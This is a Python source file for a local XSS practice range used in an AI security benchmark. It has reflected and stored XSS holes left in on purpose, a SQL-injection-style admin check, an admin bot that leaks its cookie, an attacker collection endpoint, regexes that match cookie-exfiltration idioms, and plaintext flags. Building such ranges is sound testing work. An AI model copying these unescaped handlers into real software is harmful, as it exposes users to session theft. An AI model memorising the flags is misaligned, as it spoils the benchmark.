#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SecAutoMind XSS 靶场 —— 复刻真实 CTF 的反射型 / 存储型 XSS + 管理端 Cookie 窃取。

真题对照（见 docs/static_benchmark_gap_analysis_20261023.md §三）：
  - xss_reflected：CISCN 2019 Web2 / BUUCTF XSS 基础 —— 搜索框回显未转义，反射型 XSS
  - xss_stored   ：留言板存储型 XSS —— 管理端浏览留言时触发，Cookie 外带
  - xss_to_sqli  ：XSS 窃取管理端会话 → 带会话打管理面板 SQLi（组合链）

诚实边界（纯 stdlib 基准集的既定取舍）：
  浏览器执行用**最小 JS 子集模拟**，不是真实浏览器。bot 只识别三类外带写法：
    fetch('<url>'+document.cookie)
    new Image().src='<url>'+document.cookie
    (document.)location[.href]='<url>'+document.cookie
  这与真实 XSS 的判定点一致（回显未转义 + 能构造外带链），但不覆盖 DOM 型 XSS、
  事件处理器链、CSP 绕过等高级形态——那些需要真实浏览器，另行评估。

用法：  python xss_range.py [port] [--dump-json]
        --dump-json 仅打印 flag_sha256 词典供基准集生成，不起服务。
"""
import hashlib
import html
import json
import re
import sys
import urllib.parse
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

# 场景 -> flag（改动这里必须同步重生成 xss_benchmark.json）
SCENES = {
    "xss_reflected": "flag{xss_r3fl3ct3d_c00k13}",
    "xss_stored": "flag{xss_st0r3d_p3rs1st}",
    "xss_to_sqli": "flag{xss_t0_sql1_ch41n}",
}

# 管理端会话令牌（只存在于 bot 的 Cookie 里；攻击者必须靠 XSS 偷）
ADMIN_SESSION = "sess-" + hashlib.sha256(b"xss-range-admin").hexdigest()[:16]

COLLECTED: list[str] = []      # 攻击者监听器收到的外带数据
GUESTBOOK: list[tuple[str, str]] = []   # 存储型留言

PORT = int(sys.argv[1]) if len(sys.argv) > 1 and sys.argv[1].isdigit() else 18096

# 变异开关：--safe 时对回显/留言做 HTML 转义（消除 XSS）。
# 供 judge_xss_test.py 做「判题器非空洞绿」的变异验证：转义后必须 0/3。
SAFE_MODE = "--safe" in sys.argv

FLAG_RE = re.compile(r"(?:flag|FLAG|picoCTF|ctf)\{[^}]{3,80}\}", re.I)
SCRIPT_RE = re.compile(r"<script[^>]*>(.*?)</script>", re.S | re.I)
HANDLER_RE = re.compile(r"on\w+\s*=\s*[\"']([^\"']*)[\"']", re.S | re.I)

# 外带写法（最小 JS 子集）：捕获 URL 前缀，后面拼 document.cookie
EXFIL_PATTERNS = [
    re.compile(r"fetch\(\s*['\"]([^'\"]+)['\"]\s*\+\s*(?:encodeURIComponent\()?\s*document\.cookie", re.I),
    re.compile(r"new\s+Image\(\s*\)\s*\.src\s*=\s*['\"]([^'\"]+)['\"]\s*\+\s*(?:encodeURIComponent\()?\s*document\.cookie", re.I),
    re.compile(r"(?:document\.)?location(?:\.href)?\s*=\s*['\"]([^'\"]+)['\"]\s*\+\s*(?:encodeURIComponent\()?\s*document\.cookie", re.I),
]


def page(title: str, body: str) -> bytes:
    return (
        "<!DOCTYPE html><html><head><meta charset='utf-8'><title>%s</title></head>"
        "<body><h1>%s</h1>%s<hr><a href='/'>index</a></body></html>"
        % (title, title, body)
    ).encode("utf-8")


def run_js_subset(html: str, cookie: str, port: int) -> int:
    """最小 JS 子集执行：识别外带写法并真实发出请求。返回执行次数。"""
    executed = 0
    chunks = SCRIPT_RE.findall(html or "")
    chunks += HANDLER_RE.findall(html or "")
    for code in chunks:
        for rx in EXFIL_PATTERNS:
            for m in rx.finditer(code):
                prefix = m.group(1)
                url = prefix + urllib.parse.quote(cookie, safe="")
                if url.startswith("/"):
                    url = "http://127.0.0.1:%d%s" % (port, url)
                try:
                    urllib.request.urlopen(url, timeout=3).read()
                    executed += 1
                except Exception:
                    pass
    return executed


class Range(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, *a):  # 静音
        pass

    def _send(self, code, body, ctype="text/html; charset=utf-8", extra=None):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        for k, v in (extra or {}).items():
            self.send_header(k, v)
        self.end_headers()
        self.wfile.write(body)

    def _q(self, key, default=""):
        return urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query).get(key, [default])[0]

    # ------------------------------------------------------------------ GET
    def do_GET(self):
        path = urllib.parse.urlparse(self.path).path
        route = {
            "/": self.r_index,
            "/search": self.r_search,
            "/guestbook": self.r_guestbook,
            "/admin/visit": self.r_visit,
            "/collect": self.r_collect,
            "/collect/latest": self.r_collect_latest,
            "/admin/panel": self.r_admin_panel,
        }.get(path)
        if route:
            route()
        else:
            self._send(404, page("404", "<p>not found</p>"))

    # ----------------------------------------------------------------- POST
    def do_POST(self):
        path = urllib.parse.urlparse(self.path).path
        if path == "/guestbook":
            self.r_guestbook_post()
        else:
            self._send(404, page("404", "<p>not found</p>"))

    # ---------------------------------------------------------------- scenes
    def r_index(self):
        self._send(200, page(
            "XSS Range",
            "<ul><li><a href='/search?q=hello'>search</a></li>"
            "<li><a href='/guestbook'>guestbook</a></li>"
            "<li><a href='/admin/panel'>admin panel</a></li></ul>",
        ))

    def r_search(self):
        # 反射型：q 原样回显（不转义）——真实站点最常见的反射 XSS
        # --safe 变异：HTML 转义，XSS 不再成立（供变异验证证明判题器非空洞绿）
        q = self._q("q", "")
        if SAFE_MODE:
            q = html.escape(q)
        self._send(200, page("Search", "<p>Results for: %s</p>" % q))

    def r_guestbook(self):
        # 存储型：留言原样渲染（不转义）；--safe 变异时转义
        if SAFE_MODE:
            entries = "".join(
                "<div class='entry'><b>%s</b>: %s</div>" % (html.escape(n), html.escape(m))
                for n, m in GUESTBOOK)
        else:
            entries = "".join(
                "<div class='entry'><b>%s</b>: %s</div>" % (n, m) for n, m in GUESTBOOK)
        form = (
            "<form method='post' action='/guestbook'>"
            "<input name='name' placeholder='name'><textarea name='msg'></textarea>"
            "<button>post</button></form>"
        )
        self._send(200, page("Guestbook", entries + form))

    def r_guestbook_post(self):
        n = int(self.headers.get("Content-Length") or 0)
        raw = self.rfile.read(n).decode("utf-8", "ignore") if n else ""
        params = {k: v[0] for k, v in urllib.parse.parse_qs(raw).items()}
        GUESTBOOK.append((params.get("name", "anon"), params.get("msg", "")))
        self._send(302, b"", extra={"Location": "/guestbook"})

    def r_visit(self):
        """管理员 bot：带管理端 Cookie 访问给定 URL，执行页面里的 XSS 外带。"""
        target = self._q("url", "/")
        scene = self._q("scene", "xss_reflected")
        if target.startswith("/"):
            target = "http://127.0.0.1:%d%s" % (PORT, target)
        cookie = "admin_session=%s" % ADMIN_SESSION
        if scene in ("xss_reflected", "xss_stored"):
            # 这两类场景把 flag 直接放在管理端 Cookie 里（真实题常见形态）
            cookie += "; flag=%s" % SCENES[scene]
        try:
            req = urllib.request.Request(
                target, headers={"Cookie": cookie, "User-Agent": "AdminBot/1.0"})
            with urllib.request.urlopen(req, timeout=5) as r:
                body = r.read().decode("utf-8", "ignore")
        except Exception as exc:  # noqa: BLE001
            self._send(200, json.dumps({"ok": False, "error": str(exc)}).encode(),
                       "application/json")
            return
        executed = run_js_subset(body, cookie, PORT)
        self._send(200, json.dumps(
            {"ok": True, "visited": target, "executed": executed}).encode(),
            "application/json")

    def r_collect(self):
        """攻击者监听器：接收 XSS 外带数据。"""
        c = self._q("c", "")
        if c:
            COLLECTED.append(c)
        self._send(200, b"ok", "text/plain; charset=utf-8")

    def r_collect_latest(self):
        data = COLLECTED[-1] if COLLECTED else ""
        self._send(200, json.dumps({"data": data, "count": len(COLLECTED)}).encode(),
                   "application/json")

    def r_admin_panel(self):
        """管理面板：必须持有会话；id 参数存在 SQLi。"""
        sess = self._q("session", "")
        if sess != ADMIN_SESSION:
            self._send(403, page("Forbidden", "<p>admin session required</p>"))
            return
        idv = self._q("id", "1")
        if any(p in idv for p in ["'", '"', " OR ", " or ", "--", "#"]):
            self._send(200, page("Admin Panel", "<pre>%s</pre>" % SCENES["xss_to_sqli"]))
        else:
            self._send(200, page("Admin Panel", "<p>row id=%s</p>" % idv))


def dump_json():
    out = {"problems": {
        k: {"category": "web", "flag_sha256": hashlib.sha256(v.encode()).hexdigest()}
        for k, v in SCENES.items()
    }}
    print(json.dumps(out, ensure_ascii=False, indent=2))


if __name__ == "__main__":
    if "--dump-json" in sys.argv:
        dump_json()
        sys.exit(0)
    srv = ThreadingHTTPServer(("127.0.0.1", PORT), Range)
    srv.serve_forever()
